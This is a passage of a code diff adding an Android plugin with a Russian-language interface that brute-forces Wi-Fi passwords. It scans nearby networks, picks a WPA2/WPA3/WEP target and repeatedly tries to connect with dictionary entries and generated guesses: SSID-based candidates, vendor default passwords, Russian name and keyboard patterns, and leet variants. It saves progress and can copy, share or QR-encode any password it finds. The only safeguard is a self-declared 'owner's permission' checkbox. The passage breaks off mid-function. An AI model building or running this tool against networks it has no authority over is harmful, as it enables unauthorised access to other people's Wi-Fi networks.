+                observed = self._try_password(target, password, current_settle)
+                elapsed_attempt = time.monotonic() - t0
+
+                if self._stop.is_set():
+                    break
+
+                if elapsed_attempt > 0.5:
+                    try:
+                        self._settle_samples.append(elapsed_attempt)
+                    except Exception:
+                        pass
+
+                self._checked += 1
+                elapsed = max(time.monotonic() - started, 0.001)
+                self._speed = self._checked / elapsed
+                remaining = self._total - self._checked
+                self._eta = (remaining / self._speed) if self._speed > 0 else 0.0
+
+                if observed:
+                    self._found_password = password
+                    self._reveal = True
+                    self._page = "main"
+                    self._finished = True
+                    self._outcome = "✅ Пароль найден!"
+                    with self._recent_lock:
+                        self._recent.append(
+                            (self._checked, self._mask_last4(password),
+                             True, 0))
+                        self._recent = self._recent[-self.MAX_RECENT:]
+                    self._log("success",
+                              "Подключение к выбранному SSID. "
+                              "Пароль сохранён как кандидат.")
+                    try:
+                        self.set_setting(self.FOUND_KEY, {
+                            "ssid": self._network.get("ssid", ""),
+                            "bssid": self._network.get("bssid", ""),
+                            "password": password,
+                            "ts": time.time(),
+                        })
+                    except Exception:
+                        pass
+                    self._toast("✅ Пароль найден")
+                    try:
+                        self._notify_found(self._network.get("ssid", ""),
+                                           password)
+                    except Exception:
+                        pass
+                    self._refresh(force=True)
+                    break
+
+                if self._checked % self.CHECKPOINT_EVERY == 0:
+                    self._save_checkpoint()
+
+                if self._checked % self.LOG_EVERY_N == 0:
+                    self._log("info",
+                              "Обработано {} из {}; {:.2f} п/с; "
+                              "settle {:.1f} с; осталось ~{}.".format(
+                                  self._checked, self._total, self._speed,
+                                  self._effective_settle(),
+                                  self._format_eta(self._eta)))
+                    self._refresh(force=False)
+
+                if (self._checked < self._total
+                        and self._stop.wait(self.INTER_ATTEMPT_DELAY)):
+                    break
+
+            self._finished = True
+            if self._stop.is_set():
+                self._outcome = "Остановлено"
+                if self._checked > 0:
+                    self._save_checkpoint()
+            elif not self._found_password:
+                self._outcome = "❌ Пароль не найден в словаре"
+                self._clear_checkpoint()
+                self._toast("Пароль не найден")
+            else:
+                self._clear_checkpoint()
+
+        except Exception as exc:
+            self._finished = True
+            if self._stop.is_set():
+                self._outcome = "Остановлено"
+            else:
+                self._outcome = "Проверка прервана: " + str(exc)[:160]
+                self._log("error", "audit_worker: " + str(exc)[:240])
+        finally:
+            self._running = False
+            self._refresh(force=True)
+
+    def _test_single_password(self):
+        if self._busy:
+            self._toast("Дождитесь завершения операции")
+            return
+        if self._shell_mode == "none":
+            self._manual_result = "Нет Shizuku/root — проверка недоступна"
+            self._refresh(force=True)
+            return
+        password = self._manual_password
+        if not password:
+            self._toast("Введите пароль")
+            return
+
+        sec = self._network.get("security", "")
+        if sec == "wep":
+            if not self._valid_wep(password):
+                self._manual_result = "WEP: нужно 10/26/32 hex-символа"
+                self._refresh(force=True)
+                return
+        else:
+            if not self._valid_password(password):
+                self._manual_result = "Неверный формат (8..63 символа или 64 hex)"
+                self._refresh(force=True)
+                return
+
+        if sec not in ("psk", "sae", "wep"):
+            self._manual_result = "Сначала выберите WPA2/WPA3/WEP сеть"
+            self._refresh(force=True)
+            return
+        if not self._consent:
+            self._manual_result = "Подтвердите разрешение владельца"
+            self._refresh(force=True)
+            return
+
+        target = self._network["ssid"]
+        self._target_sec = self._sec_for_connect(sec)
+        settle = self._effective_settle()
+        self._manual_busy = True
+        self._manual_result = "Проверка…"
+
+        def job():
+            try:
+                self._require_shell()
+                status0 = self._shell("cmd wifi status", allow_failure=True)
+                if self._connected_ssid(status0) == target:
+                    self._manual_result = "Уже подключены к этой сети"
+                    return
+                ok = self._try_password(target, password, settle)
+                if ok is True:
+                    self._manual_result = "✅ Подключение установлено"
+                    self._found_password = password
+                    self._reveal = True
+                elif ok is False:
+                    self._manual_result = "❌ Пароль не подошёл"
+                else:
+                    self._manual_result = "⚠️ Результат неясен, повторите"
+            except Exception as exc:
+                self._manual_result = "Ошибка: " + str(exc)[:120]
+            finally:
+                self._manual_busy = False
+                self._refresh(force=True)
+
+        self._launch(job, "io")
+
+    # ═══════════════════════════════════════════════
+    # КАНДИДАТ
+    # ═══════════════════════════════════════════════
+
+    def _toggle_reveal(self):
+        self._reveal = not self._reveal
+
+    def _clear_candidate(self):
+        self._found_password = ""
+        self._reveal = False
+        self._copy_flash = 0
+        self._finished = False
+        try:
+            self.set_setting(self.FOUND_KEY, {})
+        except Exception:
+            pass
+
+    def _copy_candidate(self):
+        try:
+            if not self._found_password:
+                self._toast("Нет кандидата для копирования")
+                return
+            android = self.api.getAndroid()
+            ok = android.clipboardSet(self._found_password)
+            if ok:
+                self._copy_flash = time.time()
+                self._toast("Пароль скопирован в буфер")
+                self._log("info", "Пароль скопирован в буфер обмена")
+            else:
+                self._toast("Не удалось скопировать")
+        except Exception as exc:
+            self._log("error", "clipboard: " + str(exc)[:180])
+            self._toast("Ошибка копирования")
+
+    def _share_candidate(self):
+        try:
+            if not self._found_password:
+                self._toast("Нет кандидата")
+                return
+            ssid = self._network.get("ssid", "")
+            text = "WiFi: {} | Пароль: {}".format(ssid, self._found_password)
+            android = self.api.getAndroid()
+
+            try:
+                android.shareText(text)
+                self._log("info", "shareText: OK")
+                return
+            except Exception as e1:
+                self._log("warning", "shareText: " + str(e1)[:150])
+
+            try:
+                ok = android.clipboardSet(text)
+                if ok:
+                    self._toast("Скопировано в буфер обмена")
+                    return
+            except Exception as e2:
+                self._log("warning", "clipboardSet: " + str(e2)[:150])
+
+            self._toast("Не удалось поделиться")
+        except Exception as exc:
+            self._log("error", "share: " + str(exc)[:180])
+            self._toast("Ошибка отправки")
+
+    def _copy_wifi_string(self):
+        try:
+            if not self._found_password:
+                self._toast("Нет пароля")
+                return
+            ssid = self._network.get("ssid", "")
+            pw = self._found_password
+            wifi_str = "WIFI:S:{};T:WPA;P:{};;".format(ssid, pw)
+            android = self.api.getAndroid()
+            ok = android.clipboardSet(wifi_str)
+            if ok:
+                self._toast("WiFi-строка скопирована")
+            else:
+                self._toast("Не удалось скопировать")
+        except Exception as exc:
+            self._log("error", "copy_wifi: " + str(exc)[:180])
+
+    def _import_from_clipboard(self):
+        try:
+            android = self.api.getAndroid()
+            text = android.clipboardGet() or ""
+            if not isinstance(text, str):
+                text = str(text)
+            parts = [p.strip() for p in re.split(r"[\r\n,;]+", text)
+                     if p.strip()]
+            valid = [p for p in parts if self._valid_password(p)]
+            if not valid:
+                self._toast("В буфере нет валидных паролей")
+                return
+            sandbox = ""
+            try:
+                sandbox = str(android.pluginFilesDir() or "")
+            except Exception:
+                sandbox = ""
+            if not sandbox:
+                self._toast("Нет доступа к приватной папке")
+                return
+            path = sandbox.rstrip("/") + "/clip_dict.txt"
+            joined = "\n".join(valid) + "\n"
+            ok = False
+            try:
+                ok = bool(android.filesWrite(path, joined))
+            except Exception:
+                ok = False
+            if not ok:
+                self._toast("Не удалось записать словарь")
+                return
+            metadata = {
+                "path": path,
+                "name": "clip_dict.txt",
+                "count": len(valid),
+                "valid": len(valid),
+            }
+            if path not in self._dicts and len(self._dicts) >= self.MAX_DICTS:
+                self._toast("Лимит словарей (16)")
+                return
+            self._dicts[path] = metadata
+            if path not in self._enabled_dicts:
+                self._enabled_dicts.append(path)
+            self._save()
+            self._log("success",
+                      "Добавлено {} паролей из буфера".format(len(valid)))
+            self._toast("Добавлено {} паролей".format(len(valid)))
+        except Exception as exc:
+            self._log("error", "clipboard_import: " + str(exc)[:200])
+            self._toast("Ошибка импорта: " + str(exc)[:60])
+
+    # ═══════════════════════════════════════════════
+    # ЖУРНАЛ
+    # ═══════════════════════════════════════════════
+
+    def _clear_logs(self):
+        with self._log_lock:
+            self._logs.clear()
+
+    def _export_logs(self):
+        with self._log_lock:
+            rows = list(self._logs)
+        text = "\n".join(
+            "[{}] {}: {}".format(stamp, level.upper(), message)
+            for level, stamp, message in rows
+        ) + "\n"
+
+        if self._shell_mode in ("shizuku", "root"):
+            try:
+                destination = "/sdcard/Download/dolphy_logs.txt"
+                temporary = "/sdcard/Download/.dolphy_logs_{}.tmp".format(
+                    time.time_ns())
+                self._shell("mkdir -p " + self._shq("/sdcard/Download"))
+                self._shell("printf '%s' '' > " + self._shq(temporary),
+                            sensitive=True, hide_command_only=True)
+                for offset in range(0, len(text), 3000):
+                    if self._stop.is_set():
+                        self._log("warning", "Экспорт остановлен")
+                        return
+                    self._shell(
+                        "printf '%s' {} >> {}".format(
+                            self._shq(text[offset:offset + 3000]),
+                            self._shq(temporary)),
+                        sensitive=True, hide_command_only=True)
+                self._shell("mv -f {} {}".format(self._shq(temporary),
+                                                  self._shq(destination)))
+                self._log("success", "Журнал сохранён: " + destination)
+                self._toast("Журнал сохранён в Download")
+                return
+            except Exception as exc:
+                self._log("warning", "export via shell: " + str(exc)[:160])
+
+        try:
+            android_obj = self.api.getAndroid()
+            sandbox = ""
+            try:
+                sandbox = str(android_obj.pluginFilesDir() or "")
+            except Exception:
+                sandbox = ""
+            if sandbox:
+                path = sandbox.rstrip("/") + "/dolphy_logs.txt"
+                ok = bool(android_obj.filesWrite(path, text))
+                if ok:
+                    self._log("success", "Журнал сохранён: " + path)
+                    self._toast("Журнал сохранён в " + path)
+                    return
+        except Exception as exc:
+            self._log("warning", "export fallback: " + str(exc)[:160])
+
+        self._toast("Не удалось сохранить журнал")
+
+    # ═══════════════════════════════════════════════
+    # UI
+    # ═══════════════════════════════════════════════
+
+    def _button(self, ui, title, callback, *args, enabled=True, style="tonal"):
+        return ui.button(title, self._bind(callback, *args),
+                         enabled=enabled, style=style)
+
+    def _bottom_nav(self, ui):
+        return ui.card([
+            ui.text("🧭  НАВИГАЦИЯ", "labelSmall", color="secondary"),
+            ui.button("🏠  На главную", self._bind(self._go, "main"),
+                      style="filled"),
+            ui.row([
+                ui.button("📡  Сети", self._bind(self._go, "networks"),
+                          style="tonal"),
+                ui.button("📚  Словари", self._bind(self._go, "dicts"),
+                          style="tonal"),
+                ui.button("📈  RSSI", self._bind(self._go, "graph"),
+                          style="tonal"),
+            ]),
+            ui.row([
+                ui.button("📋  Логи", self._bind(self._go, "logs"),
+                          style="tonal"),
+                ui.button("🔳  QR пароля", self._bind(self._go, "qr"),
+                          style="tonal"),
+            ]),
+        ], padding=16)
+
+    def _status_info(self):
+        if self._shell_mode == "shizuku":
+            return ("🟢", "Shizuku активен",
+                    "Полный доступ · перебор работает",
+                    "SHIZUKU · UID " + (self._uid or "?"), "success")
+        if self._shell_mode == "root":
+            return ("🟢", "Root активен",
+                    "Полный доступ · перебор работает",
+                    "ROOT", "success")
+        if self._shell_mode == "none":
+            return ("🟡", "Только просмотр",
+                    "Запустите Shizuku для перебора",
+                    "БЕЗ SHELL", "warning")
+        return ("⚪", "Проверка окружения…",
+                "Определяю доступные режимы",
+                "ОПРЕДЕЛЕНИЕ", "secondary")
+
+    def _busy_ui(self, ui):
+        if not self._busy or self._page == "main":
+            return []
+        return [ui.card([
+            ui.text("Сканирование…" if self._scanning
+                    else "Операция выполняется", "titleMedium"),
+            ui.circular_progress(),
+            self._button(ui, "⏹  Остановить", self._stop_work, style="tonal"),
+        ])]
+
+    def _readiness(self):
+        missing = []
+        if self._shell_mode == "none":
+            missing.append("• Shizuku или root (для перебора)")
+        if not self._consent:
+            missing.append("• Разрешение владельца")
+        sec = self._network.get("security", "")
+        if sec not in ("psk", "sae", "wep"):
+            missing.append("• Сеть WPA2/WPA3/WEP")
+        if not self._network.get("ssid"):
+            missing.append("• Выбранная сеть")
+        if (not self._enabled_dicts and not self._use_ssid_gen
+                and not self._use_vendor_gen and not self._use_ru_gen
+                and not self._use_morph):
+            missing.append("• Словарь или генератор")
+        return missing
+
+    def _hero_ui(self, ui):
+        emoji, title, sub, badge, badge_color = self._status_info()
+        ssid = self._text(self._network.get("ssid")) or ""
+        sec = self._network.get("security", "")
+        sec_name = self.SECURITY_NAMES.get(sec, "")
+        sec_emoji = self.SECURITY_EMOJI.get(sec, "❔")
+        vendor = self._vendor_for_bssid(self._network.get("bssid", ""))
+
+        ol = self._outcome.lower()
+        if ("прервана" in ol or "ошибка" in ol or "отказ" in ol
+                or "недоступ" in ol or "❌" in ol):
+            out_color = "error"
+        elif ("найден" in ol or "выполняется" in ol or "подключ" in ol
+                or "✅" in ol):
+            out_color = "success"
+        else:
+            out_color = "secondary"
+
+        children = [
+            ui.text(emoji + "  " + title, "headlineSmall"),
+            ui.text(sub, "bodySmall", color="secondary"),
+            ui.text("● " + badge, "labelSmall", color=badge_color),
+            ui.divider(),
+        ]
+
+        if ssid:
+            children.append(ui.text("🎯  " + sec_emoji + "  " + ssid,
+                                    "titleLarge"))
+            line2 = sec_name
+            if vendor:
+                line2 += "  ·  " + vendor
+            children.append(ui.text(line2, "bodySmall", color="secondary"))
+        else:
+            children.append(ui.text("🎯  Сеть не выбрана", "titleLarge",
+                                    color="secondary"))
+            children.append(ui.text("Открой «Сети» и выбери WPA2/WPA3/WEP",
+                                    "bodySmall", color="muted"))
+
+        if self._use_adaptive_settle:
+            eff = self._effective_settle()
+            children.append(ui.text(
+                "⏱  settle: {:.1f} с (адаптив)".format(eff),
+                "bodySmall", color="secondary"))
+        else:
+            children.append(ui.text(
+                "⏱  settle: {:.1f} с".format(self._settle),
+                "bodySmall", color="secondary"))
+
+        children.append(ui.text("Статус: " + self._outcome, "bodyMedium",
+                                color=out_color))
+
+        if self._scanning:
+            children.append(ui.text("⏳  Сканирование…", "bodySmall",
+                                    color="primary"))
+
+        return ui.card(children)
+
+    def _progress_ui(self, ui):
+        if not (self._total or self._running or self._finished):
+            return None
+        fraction = min(1.0, self._checked / max(self._total, 1))
+        pct = fraction * 100.0
+        return ui.card([
+            ui.text("⚡  ПРОГРЕСС", "labelSmall", color="secondary"),
+            ui.linear_progress(progress=float(fraction)),
+            ui.text("{:.1f}%  ·  {} / {}".format(
+                pct, self._checked, self._total), "titleMedium"),
+            ui.text("{:.2f} п/с  ·  осталось {}".format(
+                self._speed, self._format_eta(self._eta)),
+                "bodySmall", color="secondary"),
+        ])
+
+    def _recent_ui(self, ui):
+        with self._recent_lock:
+            rows = list(self._recent)[-5:]
+        if not rows:
+            return None
+        lines = [ui.text("🕒  ПОСЛЕДНИЕ ПОПЫТКИ", "labelSmall",
+                         color="secondary")]
+        for idx, last4, ok, ms in reversed(rows):
+            mark = "✅" if ok else "✖"
+            color = "success" if ok else "secondary"
+            lines.append(ui.text(
+                "{}  #{}  {}  ·  {} мс".format(mark, idx, last4, ms),
+                "labelSmall", color=color))
+        return ui.card(lines)
+
+    def _candidate_ui(self, ui):
+        if not self._found_password:
+            return None
+        flash = (time.time() - self._copy_flash) < 3
+        shown = self._found_password if self._reveal else "••••••••••••"
+        return ui.card([
+            ui.text("🎯  НАЙДЕННЫЙ ПАРОЛЬ", "labelSmall", color="success"),
+            ui.text("Сеть: " + self._text(self._network.get("ssid", "")),
+                    "bodyMedium"),
+            ui.text("Проверьте отдельно вручную, прежде чем полагаться",
+                    "bodySmall", color="warning"),
+            ui.text(shown, "headlineMedium",
+                    color="success" if self._reveal else "secondary"),
+            ui.row([
+                self._button(ui, "👁 Скрыть" if self._reveal
+                             else "👁 Показать", self._toggle_reveal,
+                             style="tonal"),
+                self._button(ui, "✅ Скопировано" if flash
+                             else "📋 Копировать", self._copy_candidate,
+                             enabled=not self._busy, style="filled"),
+            ]),
+            ui.row([
+                self._button(ui, "📤 Поделиться", self._share_candidate,
+                             enabled=not self._busy),
+                self._button(ui, "🔳 QR-код", self._go, "qr",
+                             enabled=not self._busy),
+            ]),
+            ui.button("🗑 Очистить", self._bind(self._clear_candidate),
+                      enabled=not self._busy, style="text"),
+        ])
+
+    def _resume_ui(self, ui):
+        if not self._resume_enabled:
+            return None
+        summary = self._checkpoint_summary()
+        if not summary:
+            return None
+        return ui.card([
+            ui.text("💾  ЧЕКПОИНТ", "labelSmall", color="primary"),
+            ui.text(summary, "bodySmall", color="secondary"),
+            ui.text("Можно продолжить с последней позиции "
+                    "или сбросить и начать заново.",
+                    "bodySmall", color="muted"),
+            ui.row([
+                self._button(ui, "▶️  Продолжить", self._start_audit,
+                             enabled=not self._busy, style="filled"),
+                self._button(ui, "🗑  Сбросить",
+                             self._clear_checkpoint,
+                             enabled=not self._busy),
+            ]),
+        ])
+
+    def _main_ui(self, ui):
+        available = not self._busy
+
+        children = [self._hero_ui(ui)]
+
+        candidate = self._candidate_ui(ui)
+        if candidate is not None:
+            children.append(candidate)
+
+        resume = self._resume_ui(ui)
+        if resume is not None:
+            children.append(resume)
+
+        progress = self._progress_ui(ui)
+        if progress is not None:
+            children.append(progress)
+
+        recent = self._recent_ui(ui)
+        if recent is not None:
+            children.append(recent)
+
+        missing = self._readiness()
+        start_style = "filled" if not missing else "tonal"
+
+        audit_children = [
+            ui.text("🔐  ПРОВЕРКА СЕТИ", "labelSmall", color="secondary"),
+            ui.checkbox(checked=self._consent,
+                        on_change=self._value(self._set_consent, refresh=True),
+                        title="Есть разрешение владельца сети",
+                        subtitle="Проверка меняет Wi-Fi-подключение",
+                        enabled=available),
+            ui.slider(value=self._settle,
+                      on_change=self._value(self._set_settle, refresh=True),
+                      minimum=int(self.MIN_SETTLE),
+                      maximum=int(self.MAX_SETTLE),
+                      steps=int(self.MAX_SETTLE - self.MIN_SETTLE),
+                      title="⏱  Пауза после подключения: {:.1f} с".format(
+                          self._settle)),
+            ui.checkbox(checked=self._use_adaptive_settle,
+                        on_change=self._value(self._toggle_adaptive,
+                                              refresh=True),
+                        title="Адаптивный settle",
+                        subtitle="Подстраивать паузу под скорость сети",
+                        enabled=available),
+            ui.checkbox(checked=self._use_ssid_gen,
+                        on_change=self._value(self._toggle_ssid_gen,
+                                              refresh=True),
+                        title="Генератор из SSID",
+                        subtitle="Кандидаты по имени сети",
+                        enabled=available),
+            ui.checkbox(checked=self._use_vendor_gen,
+                        on_change=self._value(self._toggle_vendor_gen,
+                                              refresh=True),
+                        title="Дефолты по вендору",
+                        subtitle="Заводские пароли СНГ/мира",
+                        enabled=available),
+            ui.checkbox(checked=self._use_ru_gen,
+                        on_change=self._value(self._toggle_ru_gen,
+                                              refresh=True),
+                        title="Русские паттерны",
+                        subtitle="Имена, йцукен, транслит, годы",
+                        enabled=available),
+            ui.checkbox(checked=self._use_morph,
+                        on_change=self._value(self._toggle_morph,
+                                              refresh=True),
+                        title="Морфинг (leet)",
+                        subtitle="a→4, e→3, o→0, s→5",
+                        enabled=available),
+            ui.checkbox(checked=self._resume_enabled,
+                        on_change=self._value(self._toggle_resume,
+                                              refresh=True),
+                        title="Сохранять прогресс",
+                        subtitle="Продолжать после остановки/краха",
+                        enabled=available),
+            ui.checkbox(checked=self._notify_on_found,
+                        on_change=self._value(self._toggle_notify,
+                                              refresh=True),
+                        title="Уведомление при находке",
+                        subtitle="Пуш + вибрация",
+                        enabled=available),
+            ui.text("Между попытками: {:.1f} с. Минимум паузы {} с.".format(
+                self.INTER_ATTEMPT_DELAY, int(self.MIN_SETTLE)),
+                "bodySmall", color="secondary"),
+        ]
+        if missing:
+            audit_children.append(ui.text(
+                "Не хватает:\n" + "\n".join(missing),
+                "bodySmall", color="warning"))
+        audit_children.append(ui.row([
+            self._button(ui, "▶️  Начать", self._start_audit,
+                         enabled=available, style=start_style),
+            self._button(ui, "⏹  Стоп", self._stop_work,
+                         enabled=self._busy, style="text"),
+        ]))
+        audit_children.append(ui.row([
+            self._button(ui, "🔧  Диагностика", self._launch, self._diagnose,
+                         enabled=available),
+            self._button(ui, "📡  К сетям", self._go, "networks",
+                         enabled=available),
+        ]))
+        children.append(ui.card(audit_children))
+
+        manual_children = [
+            ui.text("🧪  ТЕСТ ОДНОГО ПАРОЛЯ", "labelSmall",
+                    color="secondary"),
+            ui.text("Быстрая проверка без словаря",
+                    "bodySmall", color="secondary"),
+            ui.text_field(value=self._manual_password,
+                          on_change=self._value(self._set_manual),
+                          label="Пароль для проверки"),
+            ui.row([
+                self._button(ui, "▶️  Проверить", self._test_single_password,
+                             enabled=available and not self._manual_busy,
+                             style="filled"),
+            ]),
+        ]
+        if self._manual_result:
+            color = ("success" if "✅" in self._manual_result
+                     else "error" if "❌" in self._manual_result
+                     or "Ошибка" in self._manual_result
+                     else "warning")
+            manual_children.append(ui.text(
+                self._manual_result, "bodyMedium", color=color))
+        children.append(ui.card(manual_children))
+
+        children.append(self._bottom_nav(ui))
+        return children
+
+    def _networks_ui(self, ui):
+        available = not self._busy
+        networks = list(self._networks)
+
+        source = ("shell" if self._shell_mode in ("shizuku", "root")
+                  else "API (без shell)")
+
+        children = [ui.card([
+            ui.text("📡  СЕТИ РЯДОМ", "labelSmall", color="secondary"),
+            ui.text("Источник: " + source, "bodySmall", color="secondary"),
+            ui.text("Последнее: " + (self._scan_time or "ещё не было"),
+                    "bodySmall", color="secondary"),
+            self._button(ui,
+                         "⏳ Сканирование…" if self._scanning
+                         else "🔍  Сканировать сети",
+                         self._begin_scan, enabled=available,
+                         style="filled"),
+        ])]
+
+        children.append(ui.text_field(
+            value=self._network_filter,
+            on_change=self._value(self._set_filter),
+            label="🔎  Фильтр по SSID или BSSID"))
+
+        query = self._network_filter.strip().casefold()
+        visible = [item for item in networks
+                   if not query
+                   or query in item["ssid"].casefold()
+                   or query in item["bssid"].casefold()]
+
+        if networks:
+            children.append(ui.text("Показано: {} / {}".format(
+                len(visible), len(networks)), "bodySmall", color="secondary"))
+
+        if not visible:
+            if query and networks:
+                msg = "🔍  По фильтру ничего не найдено."
+            elif self._scanning:
+                msg = "⏳  Получаю результаты сканирования…"
+            elif self._scan_attempted:
+                msg = "⚠️  Нет результатов. Включите Wi-Fi и повторите."
+            else:
+                msg = "📡  Нажмите «Сканировать сети»."
+            children.append(ui.card([ui.text(msg, "bodyMedium",
+                                             color="secondary")]))
+
+        selected_bssid = self._network.get("bssid")
+        for network in visible:
+            selected = bool(selected_bssid) and network["bssid"] == selected_bssid
+            hidden = not network["ssid"]
+            name = network["ssid"] or "🔒 Скрытая сеть"
+            sec = network["security"]
+            sec_icon = self.SECURITY_EMOJI.get(sec, "❔")
+            sec_name = self.SECURITY_NAMES.get(sec, "—")
+            sec_color = ("success" if sec in ("psk", "sae")
+                         else "warning" if sec in ("eap", "wep")
+                         else "secondary")
+            vendor = self._vendor_for_bssid(network.get("bssid", ""))
+
+            head = sec_icon + "  " + ("✓ " if selected else "") + name
+            card_children = [
+                ui.text(head, "titleMedium",
+                        color="primary" if selected else None),
+                ui.text("{}  ·  {}  ·  {} dBm".format(
+                    sec_name, self._band(network["frequency"]),
+                    network["rssi"]),
+                    "bodySmall", color=sec_color),
+            ]
+            if vendor:
+                card_children.append(ui.text(
+                    "🏭  " + vendor, "labelSmall", color="muted"))
+            card_children.append(ui.text(self._signal(network["rssi"]),
+                                         "bodySmall", color="secondary"))
+            card_children.append(ui.text(network["bssid"], "labelSmall",
+                                         color="muted"))
+
+            if hidden:
+                card_children.append(ui.text(
+                    "⚠️  SSID отсутствует — выбрать нельзя",
+                    "bodySmall", color="warning"))
+
+            card_children.append(self._button(
+                ui,
+                "✓  Выбрана" if selected else "✅  Выбрать эту сеть",
+                self._select_network, dict(network),
+                enabled=available and not hidden,
+                style="filled" if selected else "tonal"))
+
+            children.append(ui.card(card_children))
+
+        children.append(ui.button(
+            "🔼  Скрыть исходный ответ" if self._show_raw
+            else "📄  Исходный ответ",
+            self._bind(self._toggle_raw), style="text"))
+
+        if self._show_raw:
+            children.append(ui.card([
+                ui.text("Не разобрано строк: {}".format(
+                    self._scan_unparsed), "bodySmall", color="secondary"),
+                ui.text((self._scan_raw or "(пусто)")[:3000],
+                        "labelSmall", color="secondary"),
+            ]))
+
+        children.append(self._bottom_nav(ui))
+        return children
+
+    def _dicts_ui(self, ui):
+        available = not self._busy
+
+        children = [ui.card([
+            ui.text("📚  СЛОВАРИ", "labelSmall", color="secondary"),
+            ui.text("UTF-8 · до 10 МБ · до 16 файлов · "
+                    "до {:,} паролей".format(self.MAX_PASSWORDS).replace(
+                        ",", " "),
+                    "bodySmall", color="secondary"),
+            ui.row([
+                self._button(ui, "📂  Добавить файл", self._open_browser,
+                             enabled=available, style="filled"),
+                self._button(ui, "🔍  Найти .txt", self._go, "search",
+                             enabled=available),
+            ]),
+            self._button(ui, "📋  Импорт из буфера",
+                         self._import_from_clipboard,
+                         enabled=available, style="tonal"),
+        ])]
+
+        if not self._dicts:
+            children.append(ui.card([
+                ui.text("📭  Словари пока не добавлены", "titleMedium"),
+                ui.text("Откройте Download или воспользуйтесь поиском .txt",
+                        "bodySmall", color="secondary"),
+            ]))
+
+        for path, item in list(self._dicts.items()):
+            count = item.get("count")
+            valid = item.get("valid")
+            enabled = path in self._enabled_dicts
+            mark = "✅" if enabled else "⭕"
+
+            detail = ("Будет перечитан при запуске" if valid is None
+                      else "Строк: {} · допустимых: {}".format(count, valid))
+
+            children.append(ui.card([
+                ui.text(mark + "  " + item["name"], "titleMedium"),
+                ui.text(detail, "bodySmall", color="secondary"),
+                ui.text(path, "labelSmall", color="muted"),
+                ui.row([
+                    self._button(ui,
+                                 "🚫  Отключить" if enabled else "✅  Включить",
+                                 lambda p=path, e=enabled:
+                                 self._enable_dictionary(p, not e),
+                                 enabled=available,
+                                 style="tonal" if enabled else "filled"),
+                    self._button(ui, "🗑  Убрать", self._delete_dictionary,
+                                 path, enabled=available, style="text"),
+                ]),
+            ]))
+
+        children.append(self._bottom_nav(ui))
+        return children
+
+    def _browser_ui(self, ui):
+        available = not self._busy
+        parent = ("/sdcard" if self._folder == "/sdcard"
+                  else os.path.dirname(self._folder))
+
+        children = [
+            ui.button("←  К словарям", self._bind(self._go, "dicts"),
+                      style="filled"),
+            ui.card([
+                ui.text("📂  ФАЙЛЫ", "labelSmall", color="secondary"),
+                ui.text(self._folder, "bodyMedium", color="primary"),
+                ui.row([
+                    self._button(ui, "⬆  Выше", self._open_browser, parent,
+                                 enabled=available),
+                    self._button(ui, "🔍  Поиск", self._go, "search",
+                                 enabled=available),
+                ]),
+                ui.row([
+                    self._button(ui, "📥 Download", self._open_browser,
+                                 "/sdcard/Download", enabled=available,
+                                 style="text"),
+                    self._button(ui, "📄 Documents", self._open_browser,
+                                 "/sdcard/Documents", enabled=available,
+                                 style="text"),
+                ]),
+            ]),
+        ]
+
+        visible = 0
+        for entry in list(self._files):
+            path = entry["path"]
+            is_folder = entry["folder"]
+            if not is_folder and not entry["name"].lower().endswith(".txt"):
+                continue
+            visible += 1
+
+            if is_folder:
+                cb = self._bind(self._open_browser, path)
+                label = "📂  Открыть папку"
+                emoji = "📁"
+            else:
+                cb = self._bind(self._launch,
+                                lambda p=path: self._import_dictionary(p))
+                label = "➕  Добавить словарь"
+                emoji = "📄"
+
+            children.append(ui.card([
+                ui.text(emoji + "  " + entry["name"], "titleMedium"),
+                ui.button(label, cb, enabled=available, style="tonal"),
+            ]))
+
+        if visible == 0:
+            children.append(ui.card([
+                ui.text("📭  В папке нет .txt файлов",
+                        "bodyMedium", color="secondary"),
+            ]))
+
+        children.append(self._bottom_nav(ui))
+        return children
+
+    def _search_ui(self, ui):
+        available = not self._busy
+        children = [
+            ui.button("←  К словарям", self._bind(self._go, "dicts"),
+                      style="filled"),
+            ui.card([
+                ui.text("🔍  ПОИСК .TXT", "labelSmall", color="secondary"),
+                ui.text("Введите часть имени или ищите все .txt",
+                        "bodySmall", color="secondary"),
+                ui.text_field(value=self._query,
+                              on_change=self._value(self._set_query),
+                              label="Часть имени файла"),
+                ui.slider(value=self._depth,
+                          on_change=self._value(self._set_depth, refresh=True),
+                          minimum=2, maximum=6, steps=3,
+                          title="Глубина поиска: {}".format(self._depth)),
+                ui.row([
+                    self._button(ui, "🔍  Искать", self._launch,
+                                 lambda: self._search_files(False),
+                                 enabled=available, style="filled"),
+                    self._button(ui, "📄  Все .txt", self._launch,
+                                 lambda: self._search_files(True),
+                                 enabled=available),
+                ]),
+            ]),
+        ]
+
+        if self._results:
+            children.append(ui.text("Найдено: {}".format(len(self._results)),
+                                    "titleMedium", color="success"))
+            for path in list(self._results):
+                children.append(ui.card([
+                    ui.text("📄  " + os.path.basename(path), "titleMedium"),
+                    ui.text(path, "labelSmall", color="muted"),
+                    self._button(ui, "➕  Добавить словарь", self._launch,
+                                 lambda p=path: self._import_dictionary(p),
+                                 enabled=available, style="filled"),
+                ]))
+        else:
+            children.append(ui.card([
+                ui.text("Пока ничего не найдено", "bodyMedium",
+                        color="secondary"),
+                ui.text("Введите имя или нажмите «Все .txt»",
+                        "bodySmall", color="muted"),
+            ]))
+
+        children.append(self._bottom_nav(ui))
+        return children
+
+    def _graph_ui(self, ui):
+        try:
+            with self._rssi_lock:
+                samples = list(self._rssi_samples)
+        except Exception:
+            samples = []
+
+        ssid = self._text(self._network.get("ssid")) or "Сеть не выбрана"
+
+        if not samples:
+            html = (
+                '<!doctype html><html><head><meta charset="utf-8">'
+                '<meta name="viewport" content="width=device-width,'
+                'initial-scale=1,user-scalable=no">'
+                '<style>'
+                'html,body{width:100%;background:#14101c;color:#a89bc4;'
+                'font-family:sans-serif;margin:0;padding:40px 20px;'
+                'text-align:center}'
+                '</style></head><body>'
+                '<div style="font-size:40px">📈</div>'
+                '<div style="margin-top:20px;font-size:15px">'
+                'Пока нет данных RSSI</div>'
+                '<div style="margin-top:8px;font-size:12px;color:#7a6d99">'
+                'Выберите сеть — данные начнут собираться каждые 2.5 с'
+                '</div>'
+                '</body></html>'
+            )
+        else:
+            try:
+                first_ts = samples[0][0]
+                points = [((t - first_ts), r) for t, r in samples]
+                points_json = json.dumps(points)
+            except Exception:
+                points_json = "[]"
+
+            try:
+                rssi_values = [r for _, r in samples]
+                rssi_min = min(rssi_values)
+                rssi_max = max(rssi_values)
+                rssi_avg = sum(rssi_values) / len(rssi_values)
+            except Exception:
